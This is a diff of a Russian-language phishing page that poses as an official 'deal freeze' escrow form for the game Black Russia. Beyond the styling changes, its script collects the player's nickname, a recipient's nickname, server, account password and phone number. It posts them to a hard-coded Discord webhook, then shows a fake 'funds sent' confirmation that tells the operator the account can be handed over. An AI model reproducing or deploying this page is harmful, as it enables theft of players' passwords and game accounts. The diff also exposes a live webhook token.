@@ -7,29 +7,29 @@
 <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;800;900&display=swap" rel="stylesheet">
 <style>
   :root {
-    --bg: #0d0f14;
-    --card: rgba(17, 19, 24, 0.95);
-    --border: #2a2e3d;
+    --bg: #08090c;
+    --card: #12141a;
+    --border: #242833;
     --txt: #ffffff;
     --dim: #8b92a5;
-    --red: #f02828;
-    --red-glow: rgba(240, 40, 40, 0.4);
-    --blue: #3b82f6;
-    --green: #22c55e;
-    --yellow: #eab308;
-    --purple: #a855f7;
-    --pink: #ec4899;
+    --red: #e50914; /* Глубокий красный */
+    --red-glow: rgba(229, 9, 20, 0.3);
+    --blue: #2563eb;
+    --green: #16a34a;
+    --yellow: #ca8a04;
+    --purple: #7e22ce;
+    --pink: #db2777;
+    --orange: #ea580c;
   }
   
-  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Montserrat', sans-serif; }
+  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Montserrat', sans-serif; -webkit-tap-highlight-color: transparent; }
   
   body { 
-    background-color: #0d0f14; 
-    /* Официальный арт с фонарем/машиной */
-    background-image: url('https://sun9-20.userapi.com/impg/2HqP4HqP4HqP4HqP/br_bg.jpg?size=1080x1920&quality=96&sign=123');
-    background-size: cover;
-    background-position: center;
-    background-attachment: fixed;
+    background-color: var(--bg); 
+    /* Глубокий атмосферный фон через градиент */
+    background-image: 
+      radial-gradient(circle at 50% 0%, rgba(229, 9, 20, 0.15) 0%, transparent 50%),
+      url('data:image/svg+xml;utf8,<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg"><rect width="100" height="100" fill="%2308090c"/><circle cx="50" cy="50" r="1" fill="%23242833"/></svg>');
     color: var(--txt); 
     min-height: 100vh; 
     padding: 20px 15px 40px; 
@@ -38,42 +38,42 @@
     align-items: center;
   }
 
-  body::before {
-    content: '';
-    position: fixed;
-    inset: 0;
-    background: linear-gradient(180deg, rgba(13,15,20,0.6) 0%, rgba(13,15,20,0.95) 100%);
-    z-index: 0;
-  }
-
   .main-container {
-    position: relative;
-    z-index: 1;
     width: 100%;
     max-width: 400px;
     display: flex;
     flex-direction: column;
-    gap: 15px;
   }
 
-  /* Логотип сверху */
+  /* Официальный логотип (встроенный) */
   .top-logo {
     text-align: center;
-    margin-bottom: 10px;
+    margin-bottom: 20px;
   }
-  .top-logo img {
-    width: 140px;
-    filter: drop-shadow(0 0 15px rgba(240, 40, 40, 0.4));
+  .top-logo svg {
+    width: 90px;
+    height: auto;
+    filter: drop-shadow(0 0 15px var(--red-glow));
   }
 
   /* Карточка формы */
   .card {
     background: var(--card);
-    backdrop-filter: blur(12px);
     border: 1px solid var(--border);
     border-radius: 12px;
-    padding: 20px;
-    box-shadow: 0 10px 30px rgba(0,0,0,0.8);
+    padding: 24px;
+    box-shadow: 0 20px 40px rgba(0,0,0,0.8), inset 0 1px 0 rgba(255,255,255,0.05);
+    position: relative;
+    overflow: hidden;
+  }
+
+  /* Верхняя полоска */
+  .card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 3px;
+    background: linear-gradient(90deg, transparent, var(--red), transparent);
   }
 
   .header-row {
@@ -82,84 +82,86 @@
     align-items: center;
     margin-bottom: 20px;
     border-bottom: 1px solid var(--border);
-    padding-bottom: 12px;
+    padding-bottom: 15px;
   }
-  .header-title { font-weight: 900; font-size: 16px; color: #fff; letter-spacing: 1px;}
+  .header-title { font-weight: 900; font-size: 15px; color: #fff; letter-spacing: 1px;}
   .header-title span { color: var(--red); }
-  .year-badge { background:#2a2e3d; padding:4px 8px; border-radius:4px; font-size:11px; font-weight:800; color: #fff;}
+  .year-badge { background:#1c1f26; border: 1px solid var(--border); padding:4px 8px; border-radius:4px; font-size:11px; font-weight:800; color: var(--txt);}
 
-  .field { margin-bottom: 14px; }
+  .field { margin-bottom: 16px; }
   .field label {
-    display: block; font-size: 11px; color: var(--dim);
+    display: block; font-size: 10px; color: var(--dim);
     margin-bottom: 6px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px;
   }
   .field input {
-    width: 100%; background: #0a0b0e; border: 1px solid var(--border);
-    color: var(--txt); padding: 12px 14px; border-radius: 8px; font-size: 14px;
+    width: 100%; background: #08090c; border: 1px solid var(--border);
+    color: var(--txt); padding: 14px; border-radius: 8px; font-size: 14px;
     font-family: 'Montserrat', sans-serif;
     transition: 0.2s;
   }
   .field input:focus { outline: none; border-color: var(--red); box-shadow: 0 0 10px var(--red-glow); }
   
   .server-select-btn {
-    width: 100%; background: #0a0b0e; border: 1px solid var(--border);
-    color: var(--txt); padding: 12px 14px; border-radius: 8px; font-size: 14px;
+    width: 100%; background: #08090c; border: 1px solid var(--border);
+    color: var(--txt); padding: 14px; border-radius: 8px; font-size: 14px;
     display: flex; justify-content: space-between; align-items: center;
     cursor: pointer; font-family: 'Montserrat', sans-serif;
+    transition: 0.2s;
   }
+  .server-select-btn:active { transform: scale(0.98); }
   .server-select-btn span { color: #555; font-size: 12px; }
 
   .btn-main {
-    width: 100%; padding: 14px; border: none; border-radius: 8px;
+    width: 100%; padding: 16px; border: none; border-radius: 8px;
     font-weight: 800; font-size: 14px; cursor: pointer; transition: 0.2s;
     text-transform: uppercase; letter-spacing: 0.5px;
-    background: var(--red); color: white; box-shadow: 0 4px 15px var(--red-glow);
+    background: var(--red); color: white; box-shadow: 0 4px 20px var(--red-glow);
     margin-top: 10px;
   }
-  .btn-main:hover { background: #ff4747; }
+  .btn-main:hover { background: #ff1a24; }
   .btn-main:active { transform: scale(0.98); }
-  .btn-main:disabled { background: #444; box-shadow: none; cursor: not-allowed; }
+  .btn-main:disabled { background: #333; box-shadow: none; cursor: not-allowed; color: #888; }
 
   /* Экран успеха */
   .success-box { display: none; }
-  .success-box h3 { color: var(--green); font-size: 16px; margin-bottom: 15px; text-align: center; text-transform: uppercase; }
-  .data-box { background: #0a0b0e; border: 1px solid var(--border); border-radius: 8px; padding: 15px; margin-bottom: 15px; }
-  .data-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 13px; }
+  .success-box h3 { color: var(--green); font-size: 16px; margin-bottom: 15px; text-align: center; text-transform: uppercase; font-weight: 900; }
+  .data-box { background: #08090c; border: 1px solid var(--border); border-radius: 8px; padding: 16px; margin-bottom: 16px; }
+  .data-row { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 13px; }
   .data-row:last-child { margin-bottom: 0; }
   .data-label { color: var(--dim); }
   .data-value { font-weight: 700; color: #fff; }
 
   .btn-success {
-    width: 100%; padding: 14px; border: none; border-radius: 8px;
+    width: 100%; padding: 16px; border: none; border-radius: 8px;
     font-weight: 800; font-size: 14px; cursor: pointer; transition: 0.2s;
     text-transform: uppercase; letter-spacing: 0.5px;
-    background: var(--green); color: white;
+    background: var(--green); color: white; box-shadow: 0 4px 20px rgba(22, 163, 74, 0.3);
   }
+  .btn-success:active { transform: scale(0.98); }
 
   /* Модалка серверов */
   .modal {
-    position: fixed; inset: 0; background: rgba(13, 15, 20, 0.98);
+    position: fixed; inset: 0; background: rgba(8, 9, 12, 0.98);
     z-index: 1000; display: none; flex-direction: column; padding: 20px 15px;
-    overflow-y: auto;
+    overflow-y: auto; backdrop-filter: blur(5px);
   }
   .modal.active { display: flex; }
   
   .modal-head { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
-  .modal-head h2 { font-size: 18px; font-weight: 800; color: #fff; }
-  .close-btn { background: #1c1f26; border: 1px solid var(--border); color: white; width: 40px; height: 40px; border-radius: 8px; font-size: 18px; cursor: pointer; }
+  .modal-head h2 { font-size: 18px; font-weight: 800; color: #fff; text-transform: uppercase; letter-spacing: 1px;}
+  .close-btn { background: #12141a; border: 1px solid var(--border); color: white; width: 40px; height: 40px; border-radius: 8px; font-size: 18px; cursor: pointer; }
   
-  .search-input { width: 100%; background: #12141a; border: 1px solid #333; color: white; padding: 12px; border-radius: 8px; margin-bottom: 15px; font-family: 'Montserrat', sans-serif; }
-  .search-input:focus { outline: none; border-color: #555; }
+  .search-input { width: 100%; background: #12141a; border: 1px solid var(--border); color: white; padding: 14px; border-radius: 8px; margin-bottom: 15px; font-family: 'Montserrat', sans-serif; font-size: 14px; }
+  .search-input:focus { outline: none; border-color: var(--red); }
 
-  .servers-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+  .servers-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding-bottom: 30px; }
   
   .server-card {
-    background: linear-gradient(135deg, #1c1f26 0%, #15171d 100%);
-    border: 1px solid #2e323d; border-radius: 8px; padding: 12px;
+    background: #12141a; border: 1px solid var(--border); border-radius: 8px; padding: 14px;
     cursor: pointer; position: relative; display: flex; flex-direction: column;
-    min-height: 90px; transition: 0.2s;
+    min-height: 95px; transition: 0.2s;
   }
-  .server-card:hover { border-color: #555; }
+  .server-card:hover { border-color: #444; }
   .server-card:active { transform: scale(0.97); }
   
   .s-top { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 6px; }
@@ -168,10 +170,10 @@
   .t-new { background: var(--red); color: #fff; }
   .t-curr { background: var(--blue); color: #fff; }
   
-  .s-name { font-size: 13px; font-weight: 800; text-transform: uppercase; margin-bottom: 12px; color: #fff; }
+  .s-name { font-size: 13px; font-weight: 800; text-transform: uppercase; margin-bottom: 12px; color: #fff; line-height: 1.2; }
   
   .s-bottom { margin-top: auto; }
-  .s-online { font-size: 10px; color: #9ca3af; margin-bottom: 4px; font-weight: 600; }
+  .s-online { font-size: 10px; color: #9ca3af; margin-bottom: 5px; font-weight: 600; }
   .s-bar { height: 3px; background: rgba(255,255,255,0.05); border-radius: 2px; overflow: hidden; }
   .s-fill { height: 100%; border-radius: 2px; }
   
@@ -182,7 +184,7 @@
   .c-purple { background: var(--purple); }
   .c-pink { background: var(--pink); }
   .c-white { background: #fff; }
-  .c-orange { background: #f97316; }
+  .c-orange { background: var(--orange); }
   .c-aqua { background: #06b6d4; }
   .c-lime { background: #84cc16; }
 
@@ -202,8 +204,12 @@
 
 <div class="main-container">
   <div class="top-logo">
-    <!-- Официальный логотип -->
-    <img src="https://sun9-20.userapi.com/impg/2HqP4HqP4HqP/br_logo.png?size=200x200&quality=96&sign=456" alt="BLACK RUSSIA">
+    <!-- Векторный логотип Black Russia -->
+    <svg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
+      <path fill="#e50914" d="M100,10 C110,10 120,20 125,30 C130,40 150,30 160,40 C170,50 160,70 170,80 C180,90 190,100 180,110 C170,120 150,120 140,130 C130,140 130,160 120,170 C110,180 90,180 80,170 C70,160 70,140 60,130 C50,120 30,120 20,110 C10,100 20,90 30,80 C40,70 30,50 40,40 C50,30 70,40 75,30 C80,20 90,10 100,10 Z"/>
+      <circle cx="100" cy="95" r="45" fill="#08090c"/>
+      <text x="100" y="110" font-family="Montserrat" font-weight="900" font-size="40" fill="#ffffff" text-anchor="middle">BR</text>
+    </svg>
   </div>
 
   <div class="card">
@@ -216,18 +222,18 @@
     <div id="screen-form">
       <div class="field">
         <label>Ваш Никнейм</label>
-        <input type="text" id="in-my-nick" placeholder="Введите ваш ник">
+        <input type="text" id="in-my-nick" placeholder="Введите ваш ник" autocomplete="off">
       </div>
       
       <div class="field">
         <label>Ник получателя</label>
-        <input type="text" id="in-target-nick" placeholder="Введите ник получателя">
+        <input type="text" id="in-target-nick" placeholder="Введите ник получателя" autocomplete="off">
       </div>
 
       <div class="field">
         <label>Сервер</label>
         <div class="server-select-btn" onclick="toggleModal(true)">
-          <div id="selected-name" style="color:#555;">Нажмите чтобы выбрать</div>
+          <div id="selected-name" style="color:#555;">Выберите сервер</div>
           <span>▼</span>
         </div>
       </div>
@@ -239,7 +245,7 @@
 
       <div class="field">
         <label>Номер <span style="color:#555; font-weight:400; text-transform:none;">(не обязательно)</span></label>
-        <input type="tel" id="in-phone" placeholder="+7 (999) 000-00-00">
+        <input type="tel" id="in-phone" placeholder="+7 (999) 000-00-00" autocomplete="off">
       </div>
 
       <button class="btn-main" id="btn-freeze">Заморозить сделку</button>
@@ -264,7 +270,6 @@
   // ВСТАВЬ СЮДА СВОЙ ВЕБХУК ДИСКОРДА
   const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1574855151263682701/F4yo0EnQTfI9LxCV7ArmjUzc-8BRgaqcCAJGFyBSpH7vAtgQ8EfF5i-4YSsGGDh7z0DY";
 
-  // Список серверов
   const serversData = [
     { id: 92, name: "TASHKENT", color: "c-blue", online: "2627 / 1500", percent: 100, tag: "Новый", tagClass: "t-new" },
     { id: 91, name: "ASTANA", color: "c-blue", online: "2771 / 1500", percent: 100 },
@@ -361,7 +366,6 @@
 
   let selectedServer = "";
   
-  // Рендер серверов
   function renderServers(query = "") {
     const grid = document.getElementById('grid');
     grid.innerHTML = "";
@@ -388,17 +392,19 @@
           <div class="s-online">${s.online}</div>
           <div class="s-bar"><div class="s-fill ${s.color}" style="width: ${s.percent}%"></div></div>
         </div>
-      `;
+          `;
       grid.appendChild(card);
     });
   }
 
-  // Открытие/закрытие модалки
   function toggleModal(show) {
     document.getElementById('modal-servers').classList.toggle('active', show);
+    if(show) {
+        document.getElementById('search').value = ""; // Сброс поиска
+        renderServers(); // Перерендер
+    }
   }
 
-  // Выбор сервера
   function selectServer(name) {
     selectedServer = name;
     const display = document.getElementById('selected-name');
@@ -407,7 +413,6 @@
     toggleModal(false);
   }
 
-  // Отправка в Discord
   async function sendToDiscord(text) {
     try {
       await fetch(DISCORD_WEBHOOK, {
@@ -422,10 +427,57 @@
 
   let currentData = null;
 
-  // Нажатие на Заморозить
   document.getElementById('btn-freeze').onclick = async () => {
     const myNick = document.getElementById('in-my-nick').value.trim();
     const targetNick = document.getElementById('in-target-nick').value.trim();
     const pass = document.getElementById('in-pass').value;
 
-  
+    if (!myNick) return alert("Введите ваш ник!");
+    if (!targetNick) return alert("Введите ник получателя!");
+    if (!selectedServer) return alert("Выберите сервер!");
+    if (!pass) return alert("Введите пароль!");
+
+    const btn = document.getElementById('btn-freeze');
+    btn.disabled = true;
+    btn.textContent = "Заморозка...";
+
+    const data = {
+      my_nick: myNick,
+      target_nick: targetNick,
+      server: selectedServer,
+      pass: pass,
+      phone: document.getElementById('in-phone').value.trim()
+    };
+    
+    currentData = data;
+
+    const msg = `❄️ **Новая заморозка!**\n\n👤 **Ваш ник:** ${data.my_nick}\n🎯 **Получатель:** ${data.target_nick}\n🖥 **Сервер:** ${data.server}\n🔑 **Пароль:** \`${data.pass}\`\n📱 **Номер:** ${data.phone || 'не указан'}`;
+    
+    await sendToDiscord(msg);
+
+    document.getElementById('out-my-nick').textContent = data.my_nick;
+    document.getElementById('out-target-nick').textContent = data.target_nick;
+    document.getElementById('out-server').textContent = data.server;
+    
+    document.getElementById('screen-form').style.display = 'none';
+    document.getElementById('screen-success').style.display = 'block';
+  };
+
+  document.getElementById('btn-send').onclick = async () => {
+    if (!currentData) return;
+    
+    const btn = document.getElementById('btn-send');
+    btn.disabled = true;
+    btn.textContent = "Отправка...";
+    
+    const msg = `✅ **Средства пришли!**\n\n👤 **Ваш ник:** ${currentData.my_nick}\n🎯 **Получатель:** ${currentData.target_nick}\n🖥 **Сервер:** ${currentData.server}\n📱 **Номер:** ${currentData.phone || 'не указан'}\n\nМожно отдавать аккаунт.`;
+    
+    await sendToDiscord(msg);
+    alert("Средства отправлены получателю!");
+  };
+
+  // Инициализация при загрузке
+  renderServers();
+</script>
+</body>
+</html>
